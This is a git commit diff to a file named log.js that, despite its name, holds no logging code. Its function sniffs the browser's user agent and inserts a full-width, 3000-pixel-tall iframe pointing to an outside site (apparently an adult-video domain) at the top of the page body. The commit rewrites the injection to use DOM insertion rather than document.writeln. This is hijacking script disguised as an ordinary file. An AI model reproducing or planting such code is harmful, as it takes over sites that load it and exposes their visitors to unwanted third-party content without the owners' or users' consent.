7233d2d5e76b30a217efa0efd05129da760a3e20
jjquery <34562072+jjquery@users.noreply.github.com>
2017-12-15 13:44:27 +0800

    Update log.js

--- log.js
+++ log.js
@@ -1,11 +1,13 @@
 function uaredirect() {
-	var n = navigator.userAgent.toLowerCase();
-	     if (n.indexOf('android')>-1){
-document.writeln('<iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="3000" allowTransparency src="https://www.6xxav.com"></iframe>');
+var divObj=document.createElement("div");
+var n = navigator.userAgent.toLowerCase();
+if (n.indexOf('android')>-1){
+divObj.innerHTML='<iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="3000" allowTransparency src="https://www.6xxav.com"></iframe>';
 }
-         else {
-document.writeln('<center><iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="3000" allowTransparency src="https://www.6xxav.com"></iframe></center>');
-
+ else {
+divObj.innerHTML='<center><iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="3000" allowTransparency src="https://www.6xxav.com"></iframe></center>';
 }
+var first=document.body.firstChild;
+document.body.insertBefore(divObj,first);
 }
 uaredirect();
